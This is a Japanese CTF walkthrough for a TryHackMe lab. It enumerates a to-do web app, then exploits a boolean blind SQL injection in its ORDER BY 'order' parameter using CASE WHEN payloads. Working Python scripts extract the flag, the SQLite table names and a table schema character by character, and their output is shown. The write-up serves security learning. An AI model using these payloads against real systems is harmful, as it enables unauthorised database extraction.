# Prioritize CTF

https://tryhackme.com/room/prioritise

## Enumeration

```shell
TARGET=10.10.255.146
sudo bash -c "echo $TARGET   prioritize.thm >> /etc/hosts"
```

### ポートスキャン

```shell
root@ip-10-10-23-92:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-06-07 01:25 BST
Nmap scan report for prioritize.thm (10.10.255.146)
Host is up (0.00015s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:BE:DD:DA:0B:5D (Unknown)
```

### gobuster

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

gobuster dir -x=txt,php -u http://prioritize.thm -w ./dirlist.txt -t 30 -k

===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/new                  (Status: 405) [Size: 178]
Progress: 681570 / 681573 (100.00%)
===============================================================
```

/new だけ検出した。

## リクエストの種類

画面を操作して確認。

### GET / 

```
GET / HTTP/1.1
GET /?order=date HTTP/1.1
GET /?order=done HTTP/1.1
GET /?order=title HTTP/1.1
GET /?success=Added%20new%20item HTTP/1.1
GET /?success=Deleted%20item HTTP/1.1
```

### POST /new

```
POST /new HTTP/1.1
...
title=abc&date=06%2F25%2F2025
```

### GET /delete

```
GET /delete/1 HTTP/1.1
```

## sqlmap

### GET /

```sh
sqlmap -r ./get-order.txt -p order --dbs -batch

[09:43:15] [CRITICAL] all tested parameters do not appear to be injectable. 

sqlmap -r ./get-success.txt -p success --dbs -batch

[09:44:56] [CRITICAL] all tested parameters do not appear to be injectable.
```

### POST /new

```sh
sqlmap -r ./post-new.txt -p title --dbs -batch

[09:47:44] [CRITICAL] all tested parameters do not appear to be injectable.

sqlmap -r ./post-new.txt -p date --dbs -batch

[09:48:29] [CRITICAL] all tested parameters do not appear to be injectable.
```

### GET /delete

delete は parameter型ではないので、sqlmap では扱えない。

ffuf でファジングしたが何も出ない。

```sh
ffuf -u 'http://prioritize.thm/delete/FUZZ' -c -w /usr/share/wordlists/seclists/Fuzzing/Databases/NoSQL.txt -fs 244
```

ツールでは何も出なかった。

## ORDER BY SQLi

ルーム名をヒントに、order に焦点を絞って調べたところ、order by SQL injection の情報を見つけた。

https://khalid-emad.gitbook.io/order-by-sql-injection#code-analysis

下記の方法でSQLiの余地があることを確認した。

```sh
# title でソートされる
http://prioritize.thm/?order=CASE%20WHEN(1=1)%20THEN%20title%20ELSE%20date%20END

# date でソートされる
http://prioritize.thm/?order=CASE%20WHEN(1=0)%20THEN%20title%20ELSE%20date%20END
```

参照元では、下記の形でフラグの値を絞っていた。

```SQL
CASE WHEN((select substr(flag,1,1) from flag)= 'f') THEN symbol ELSE atomic_number END
```

試しに、同じテーブル名、列名で実行してみたら、flag テーブルにfrag列があり、1文字目が f であることが分かった。

```sh
# date でソートされる
http://prioritize.thm/?order=CASE%20WHEN((select%20substr(flag,1,1)%20from%20flag)=%20%27a%27)%20THEN%20title%20ELSE%20date%20END

# title でソートされる
http://prioritize.thm/?order=CASE%20WHEN((select%20substr(flag,1,1)%20from%20flag)=%20%27f%27)%20THEN%20title%20ELSE%20date%20END
```

回答の桁数が非常に長いのでスクリプト化する。

## スクリプト

| title | date         |
|-------|--------------|
| aaa   | 2025-06-30   |
| zzz   | 2025-06-01   |

という２データを登録しているとする。  
実際の応答を見て、1行目のタイトルが含まれ、2行目のタイトルが含まれない位置を 3096 バイトと設定。

```python
import requests
import string

url = "http://prioritize.thm/"
charset = string.ascii_letters + string.digits + "_{}-"
known = ""
max_len = 50  # フラグの最大長と仮定

for i in range(1, max_len + 1):
    found = False
    for c in charset:
        payload = f"CASE WHEN ((select substr(flag,1,{i}) from flag)='{known + c}') THEN title ELSE date END"
        params = {'order': payload}
        r = requests.get(url, params=params)

        # 簡単な判定：レスポンス内の順序で判定
        if 'aaa' in r.text[:3096]:  # 先頭が title でソートされている場合
            known += c
            print(f"[+] Found character {i}: {c} -> {known}")
            found = True
            break

    if not found:
        print("[!] No match found. Exiting.")
        break

print(f"[✓] Final flag: {known}")
```

成功！

```sh
$ python ./exploit.py         
[+] Found character 1: f -> f
[+] Found character 2: l -> fl
[+] Found character 3: a -> fla
[+] Found character 4: g -> flag
[+] Found character 5: { -> flag{

...

[✓] Final flag: flag{...............................}
```

## 振り返り

- ORDER BY SQLi は初見で目から鱗。
- ただ今回は、意図せず flag テーブルと flag 列の発見過程をすっ飛ばしてしまったので、その過程を検証してみる。

### テーブル名の抽出

```python
import requests
import string

url = "http://prioritize.thm/"
charset = string.ascii_letters + string.digits + "_"
max_table_count = 10   # 最大テーブル数
max_name_len = 30      # テーブル名の最大長（仮定）

def check_sort(payload):
    params = {'order': payload}
    r = requests.get(url, params=params)
    return 'aaa' in r.text[:3096]  # title順ならTrue

found_tables = []

for table_index in range(max_table_count):
    table_name = ""
    for char_pos in range(1, max_name_len + 1):
        found = False
        for c in charset:
            injected = (
                f"CASE WHEN ((SELECT substr(name,{char_pos},1) "
                f"FROM sqlite_master WHERE type='table' "
                f"LIMIT 1 OFFSET {table_index}) = '{c}') "
                f"THEN title ELSE date END"
            )

            if check_sort(injected):
                table_name += c
                print(f"[+] Table {table_index}, Char {char_pos}: {c} -> {table_name}")
                found = True
                break
        if not found:
            break  # 文字が見つからなければこのテーブル名はここまで
    if table_name:
        found_tables.append(table_name)
    else:
        break  # テーブルがもうない

print("\n[✓] Found Tables:")
for i, name in enumerate(found_tables):
    print(f"  {i + 1}: {name}")
```

todos, flag の2テーブルがあることを確認。

```sh
$ python ./tables.py 
[+] Table 0, Char 1: t -> t
[+] Table 0, Char 2: o -> to
[+] Table 0, Char 3: d -> tod
[+] Table 0, Char 4: o -> todo
[+] Table 0, Char 5: s -> todos
[+] Table 1, Char 1: f -> f
[+] Table 1, Char 2: l -> fl
[+] Table 1, Char 3: a -> fla
[+] Table 1, Char 4: g -> flag

[✓] Found Tables:
  1: todos
  2: flag
```

### 列名の抽出

CREATE TABLE の定義を出力する。文字に改行等を追加していることに注意。  

```python
import requests
import string

url = "http://prioritize.thm/"
charset = string.ascii_letters + string.digits + "_(),\"' \t\n\r"
max_sql_len = 300  # CREATE文の最大長（必要に応じて増やす）

def check_sort(payload): 
    params = {'order': payload}
    r = requests.get(url, params=params)
    return 'aaa' in r.text[:3096]

# 抽出用の文字列
recovered_sql = ""

for i in range(1, max_sql_len + 1):
    found = False
    for c in charset:
        injected = (
            f"CASE WHEN ((SELECT substr(sql,{i},1) "
            f"FROM sqlite_master WHERE type='table' AND name='flag') = '{c}') "
            f"THEN title ELSE date END"
        )
        if check_sort(injected):
            recovered_sql += c
            print(f"[{i:03}] {c} -> {recovered_sql}")
            found = True
            break
    if not found:
        print(f"[{i:03}] End of SQL statement.")
        break

print("\n[✓] Extracted CREATE TABLE SQL:")
print(recovered_sql)
```

flag 列を確認。

```sh
$ python ./columns.py
[001] C -> C
[002] R -> CR
[003] E -> CRE
[004] A -> CREA
[005] T -> CREAT
[006] E -> CREATE
[007]   -> CREATE 
[008] T -> CREATE T

...

[036] ) -> CREATE TABLE "flag" (
        "flag"  TEXT
)
[037] End of SQL statement.

[✓] Extracted CREATE TABLE SQL:
CREATE TABLE "flag" (
        "flag"  TEXT
)
```
